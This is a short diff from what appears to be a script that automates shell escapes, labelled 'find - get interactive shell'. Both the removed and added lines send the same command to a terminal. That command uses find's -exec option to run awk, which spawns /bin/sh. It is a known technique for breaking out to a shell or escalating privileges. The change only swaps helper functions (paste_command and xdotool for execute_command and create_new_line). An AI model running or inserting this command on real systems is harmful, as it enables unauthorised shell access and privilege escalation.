@@ -4,5 +4,5 @@
 find - get interactive shell
 '
 
-paste_command "find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
-xdotool key Return
+execute_command "find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
+create_new_line
